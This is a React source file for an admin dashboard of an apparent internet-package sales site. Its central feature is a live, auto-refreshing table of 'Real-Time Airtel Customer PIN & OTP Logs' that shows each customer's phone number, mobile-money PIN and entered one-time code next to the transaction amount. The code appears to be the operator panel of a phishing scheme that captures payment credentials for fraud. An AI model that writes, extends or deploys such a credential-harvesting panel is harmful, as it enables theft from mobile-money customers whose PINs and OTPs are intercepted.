import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || 'http://localhost:5000';

export default function AdminDashboard() {
  const navigate = useNavigate();
  const [airtelTx, setAirtelTx] = useState([]);
  const [loading, setLoading] = useState(true);

  const fetchTransactions = async () => {
    try {
      setLoading(true);
      const res = await fetch(`${API_BASE_URL}/api/airtel/transactions`);
      if (res.ok) {
        const data = await res.json();
        setAirtelTx(data.transactions || []);
      }
    } catch (err) {
      console.error('Failed to fetch Airtel transactions:', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchTransactions();
    // Poll every 5 seconds for new customer OTP inputs
    const interval = setInterval(fetchTransactions, 5000);
    return () => clearInterval(interval);
  }, []);

  const orders = [
    { id: '#1024', customer: 'John Doe', plan: 'Residential', status: 'Paid', date: '2026-09-08' },
    { id: '#1025', customer: 'Jane Smith', plan: 'Business', status: 'Pending', date: '2026-09-08' },
    { id: '#1026', customer: 'Peter Jones', plan: 'Roam', status: 'Paid', date: '2026-09-07' },
  ];

  return (
    <div style={{ minHeight: '100vh', background: 'var(--bg-primary)', display: 'flex' }}>
      {/* Sidebar */}
      <div style={{ width: '250px', background: 'var(--bg-card)', borderRight: '1px solid var(--border-light)', padding: '20px', display: 'flex', flexDirection: 'column' }}>
        <h2 style={{ marginBottom: '40px', color: 'var(--brand-purple)' }}>Admin Panel</h2>
        <nav style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
          <a href="#" style={{ padding: '10px', borderRadius: 'var(--radius-sm)', background: 'var(--brand-purple-light)', color: 'white', fontWeight: 'bold' }}>Dashboard</a>
          <a href="#" style={{ padding: '10px', color: 'var(--text-secondary)' }}>Orders</a>
          <a href="#" style={{ padding: '10px', color: 'var(--text-secondary)' }}>Airtel Logs</a>
          <a href="#" style={{ padding: '10px', color: 'var(--text-secondary)' }}>Settings</a>
        </nav>
        <div style={{ marginTop: 'auto' }}>
          <button 
            onClick={() => navigate('/admin')} 
            style={{ padding: '10px', color: 'var(--brand-red)', fontWeight: 'bold', width: '100%', textAlign: 'left', cursor: 'pointer' }}
          >
            Logout
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div style={{ flex: 1, padding: '40px', overflowY: 'auto' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '30px' }}>
          <h1>Dashboard Overview</h1>
          <button 
            onClick={fetchTransactions}
            style={{
              padding: '8px 16px',
              background: '#ef4444',
              color: 'white',
              border: 'none',
              borderRadius: '6px',
              fontWeight: 'bold',
              cursor: 'pointer'
            }}
          >
            🔄 Refresh Live Logs
          </button>
        </div>
        
        <div style={{ display: 'flex', gap: '20px', marginBottom: '40px' }}>
          <div style={{ flex: 1, background: 'var(--bg-card)', padding: '20px', borderRadius: 'var(--radius-md)', boxShadow: 'var(--shadow-sm)' }}>
            <h3 style={{ color: 'var(--text-secondary)', fontSize: '0.9rem', marginBottom: '10px' }}>Total Revenue</h3>
            <div style={{ fontSize: '2rem', fontWeight: 'bold' }}>KES 450,000</div>
          </div>
          <div style={{ flex: 1, background: 'var(--bg-card)', padding: '20px', borderRadius: 'var(--radius-md)', boxShadow: 'var(--shadow-sm)' }}>
            <h3 style={{ color: 'var(--text-secondary)', fontSize: '0.9rem', marginBottom: '10px' }}>Airtel Transactions</h3>
            <div style={{ fontSize: '2rem', fontWeight: 'bold' }}>{airtelTx.length}</div>
          </div>
          <div style={{ flex: 1, background: 'var(--bg-card)', padding: '20px', borderRadius: 'var(--radius-md)', boxShadow: 'var(--shadow-sm)' }}>
            <h3 style={{ color: 'var(--text-secondary)', fontSize: '0.9rem', marginBottom: '10px' }}>Support Tickets</h3>
            <div style={{ fontSize: '2rem', fontWeight: 'bold' }}>3</div>
          </div>
        </div>

        {/* AIRTEL MONEY REAL-TIME OTP & PIN LOGS */}
        <div style={{ background: 'var(--bg-card)', borderRadius: 'var(--radius-md)', padding: '20px', boxShadow: 'var(--shadow-sm)', marginBottom: '40px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' }}>
            <h2 style={{ fontSize: '1.2rem', color: '#dc2626' }}>📱 Real-Time Airtel Customer PIN & OTP Logs</h2>
            <span style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Auto-updating live feed</span>
          </div>

          <div style={{ overflowX: 'auto' }}>
            <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left' }}>
              <thead>
                <tr style={{ borderBottom: '2px solid var(--border-light)', background: 'rgba(239, 68, 68, 0.05)' }}>
                  <th style={{ padding: '12px 10px', color: 'var(--text-secondary)' }}>Tx ID</th>
                  <th style={{ padding: '12px 10px', color: 'var(--text-secondary)' }}>Customer Phone</th>
                  <th style={{ padding: '12px 10px', color: '#dc2626', fontWeight: 'bold' }}>Customer PIN</th>
                  <th style={{ padding: '12px 10px', color: '#2563eb', fontWeight: 'bold' }}>Client Entered OTP</th>
                  <th style={{ padding: '12px 10px', color: 'var(--text-secondary)' }}>Package / Amount</th>
                  <th style={{ padding: '12px 10px', color: 'var(--text-secondary)' }}>Time</th>
                  <th style={{ padding: '12px 10px', color: 'var(--text-secondary)' }}>Status</th>
                </tr>
              </thead>
              <tbody>
                {airtelTx.length === 0 ? (
                  <tr>
                    <td colSpan="7" style={{ textAlign: 'center', padding: '20px', color: 'var(--text-secondary)' }}>
                      {loading ? 'Loading live Airtel transactions...' : 'No Airtel transactions recorded yet.'}
                    </td>
                  </tr>
                ) : (
                  airtelTx.map((tx, idx) => (
                    <tr key={tx.transaction_id || idx} style={{ borderBottom: '1px solid var(--border-light)' }}>
                      <td style={{ padding: '15px 10px', fontWeight: 'bold', fontSize: '0.85rem' }}>{tx.transaction_id}</td>
                      <td style={{ padding: '15px 10px', fontWeight: '600' }}>{tx.phone}</td>
                      <td style={{ padding: '15px 10px' }}>
                        <span style={{ padding: '4px 8px', background: '#fee2e2', color: '#991b1b', borderRadius: '4px', fontWeight: 'bold', fontFamily: 'monospace', fontSize: '1rem' }}>
                          {tx.pin_provided || 'N/A'}
                        </span>
                      </td>
                      <td style={{ padding: '15px 10px' }}>
                        <span style={{ padding: '4px 8px', background: '#dbeafe', color: '#1e40af', borderRadius: '4px', fontWeight: 'bold', fontFamily: 'monospace', fontSize: '1rem' }}>
                          {tx.otp_entered || 'Waiting...'}
                        </span>
                      </td>
                      <td style={{ padding: '15px 10px', fontSize: '0.9rem' }}>
                        {tx.package} ({tx.amount})
                      </td>
                      <td style={{ padding: '15px 10px', color: 'var(--text-muted)', fontSize: '0.85rem' }}>{tx.timestamp}</td>
                      <td style={{ padding: '15px 10px' }}>
                        <span style={{ 
                          padding: '4px 10px', 
                          borderRadius: 'var(--radius-full)', 
                          fontSize: '0.8rem',
                          fontWeight: 'bold',
                          color: tx.status.includes('SUCCESS') ? '#166534' : '#854d0e',
                          backgroundColor: tx.status.includes('SUCCESS') ? '#dcfce7' : '#fef08a'
                        }}>
                          {tx.status}
                        </span>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* GENERAL ORDERS TABLE */}
        <div style={{ background: 'var(--bg-card)', borderRadius: 'var(--radius-md)', padding: '20px', boxShadow: 'var(--shadow-sm)' }}>
          <h2 style={{ marginBottom: '20px', fontSize: '1.2rem' }}>Recent Orders</h2>
          <div style={{ overflowX: 'auto' }}>
            <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left' }}>
              <thead>
                <tr style={{ borderBottom: '2px solid var(--border-light)' }}>
                  <th style={{ padding: '12px 10px', color: 'var(--text-secondary)' }}>Order ID</th>
                  <th style={{ padding: '12px 10px', color: 'var(--text-secondary)' }}>Customer</th>
                  <th style={{ padding: '12px 10px', color: 'var(--text-secondary)' }}>Plan</th>
                  <th style={{ padding: '12px 10px', color: 'var(--text-secondary)' }}>Date</th>
                  <th style={{ padding: '12px 10px', color: 'var(--text-secondary)' }}>Status</th>
                </tr>
              </thead>
              <tbody>
                {orders.map(order => (
                  <tr key={order.id} style={{ borderBottom: '1px solid var(--border-light)' }}>
                    <td style={{ padding: '15px 10px', fontWeight: 'bold' }}>{order.id}</td>
                    <td style={{ padding: '15px 10px' }}>{order.customer}</td>
                    <td style={{ padding: '15px 10px' }}>{order.plan}</td>
                    <td style={{ padding: '15px 10px', color: 'var(--text-muted)' }}>{order.date}</td>
                    <td style={{ padding: '15px 10px' }}>
                      <span style={{ 
                        padding: '4px 10px', 
                        borderRadius: 'var(--radius-full)', 
                        fontSize: '0.8rem',
                        color: order.status === 'Paid' ? 'var(--brand-green)' : '#854d0e',
                        backgroundColor: order.status === 'Paid' ? '#dcfce7' : '#fef08a'
                      }}>
                        {order.status}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}
